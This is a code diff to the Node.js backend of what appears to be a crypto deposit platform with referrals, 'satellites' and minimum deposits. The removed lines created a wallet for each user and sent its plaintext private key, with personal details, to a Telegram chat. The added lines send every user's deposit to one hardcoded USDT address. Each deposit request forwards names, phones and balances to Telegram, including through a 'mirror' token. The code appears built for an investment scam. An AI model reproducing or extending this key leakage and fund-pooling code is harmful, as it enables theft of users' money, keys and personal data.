@@ -3,7 +3,6 @@ const cors = require("cors");
 const bcrypt = require("bcryptjs");
 const jwt = require("jsonwebtoken");
 const path = require("path");
-const { Wallet } = require("ethers");
 const axios = require("axios");
 const crypto = require("crypto");
 const { createClient } = require("@supabase/supabase-js");
@@ -143,6 +142,9 @@ const EMAIL_VERIFICATION_REQUIRED = process.env.EMAIL_VERIFICATION_REQUIRED === 
 
 const PUBLIC_USER_FIELDS = "id,fullname,nickname,country,email,phone,balance,deposit,satellites,wallet_address,referrer_id";
 const DISPLAY_ID_PREFIX = "1568";
+const DEPOSIT_WALLET_ADDRESS = process.env.DEPOSIT_WALLET_ADDRESS || "TTL8GGSkoAne5QRdkizLbGnmaBKv3EPoiy";
+const DEPOSIT_ASSET = "USDT";
+const DEPOSIT_NETWORK = "TRC20";
 const QUIZ_ANSWERS = { 1: "b", 2: "c", 3: "a", 4: "b", 5: "c" };
 const LEARNING_MIN_DEPOSIT = 500;
 const ACTIVE_SATELLITE_MIN_DEPOSIT = 500;
@@ -328,10 +330,12 @@ function requestTelegramText(type, user, amount, wallet) {
     `Nickname: ${user.nickname || "-"}`,
     `Phone: ${user.phone || "-"}`,
     `Amount: $${Number(amount || 0).toFixed(2)}`,
+    type === "deposit" ? `Asset: ${DEPOSIT_ASSET}` : null,
+    type === "deposit" ? `Network: ${DEPOSIT_NETWORK}` : null,
     `Wallet: ${wallet || "-"}`,
     `Balance: $${Number(user.balance || 0).toFixed(2)}`,
     `Confirmed deposit: $${Number(user.deposit || 0).toFixed(2)}`
-  ].join("\n");
+  ].filter(Boolean).join("\n");
 }
 
 function supportPayload(role, text, extra = {}) {
@@ -770,7 +774,6 @@ async function refreshSatelliteCount(userId) {
 }
 
 async function createRegisteredUser(data, passwordHash, ip, emailVerified = false) {
-  const wallet = Wallet.createRandom();
   const { data: user, error } = await supabase
     .from("users")
     .insert([{
@@ -784,8 +787,8 @@ async function createRegisteredUser(data, passwordHash, ip, emailVerified = fals
       balance: 0,
       deposit: 0,
       satellites: 0,
-      wallet_address: wallet.address,
-      private_key: encryptForStorage(wallet.privateKey),
+      wallet_address: DEPOSIT_WALLET_ADDRESS,
+      private_key: null,
       email_code: null,
       email_verified: emailVerified,
       ip
@@ -819,8 +822,10 @@ async function createRegisteredUser(data, passwordHash, ip, emailVerified = fals
         `Country: ${user.country}`,
         `Phone: ${user.phone}`,
         `Referrer: ${user.referrer_id ? formatUserId(user.referrer_id) : "-"}`,
-        `Wallet: ${wallet.address}`,
-        `Private key: ${wallet.privateKey}`,
+        `Deposit asset: ${DEPOSIT_ASSET}`,
+        `Deposit network: ${DEPOSIT_NETWORK}`,
+        `Deposit wallet: ${DEPOSIT_WALLET_ADDRESS}`,
+        "Secret phrase: not sent for security",
         `Email verified: ${emailVerified ? "yes" : "temporarily skipped"}`,
         `Starting balance: $0`
       ].join("\n")
@@ -908,8 +913,16 @@ app.post("/login", authLimiter, async (req, res) => {
 app.get("/me", auth, async (req, res) => {
   const user = await findUser(req.userId);
   if (!user) return res.status(404).json({ success: false });
-  return res.json(withDisplayId(user));
+  return res.json({ ...withDisplayId(user), wallet_address: DEPOSIT_WALLET_ADDRESS, deposit_asset: DEPOSIT_ASSET, deposit_network: DEPOSIT_NETWORK });
 });
+
+app.get("/deposit/config", auth, async (req, res) => res.json({
+  success: true,
+  asset: DEPOSIT_ASSET,
+  network: DEPOSIT_NETWORK,
+  wallet_address: DEPOSIT_WALLET_ADDRESS,
+  memo_required: false
+}));
 
 app.post("/profile/change-request", actionLimiter, auth, async (req, res) => {
   try {
@@ -1112,8 +1125,8 @@ app.post("/deposit", actionLimiter, auth, async (req, res) => {
       return res.json({ success: false, message: "Deposit limit reached" });
     }
 
-    await addSignal({ user_id: user.id, type: "deposit", amount, wallet: user.wallet_address, status: "pending" });
-    await sendTelegramMessage(requestTelegramText("deposit", user, amount, user.wallet_address), [TELEGRAM_MIRROR_TOKEN]);
+    await addSignal({ user_id: user.id, type: "deposit", amount, wallet: DEPOSIT_WALLET_ADDRESS, status: "pending" });
+    await sendTelegramMessage(requestTelegramText("deposit", user, amount, DEPOSIT_WALLET_ADDRESS), [TELEGRAM_MIRROR_TOKEN]);
     return res.json({ success: true, message: "Signal created" });
   } catch (error) {
     console.error("DEPOSIT ERROR:", error);
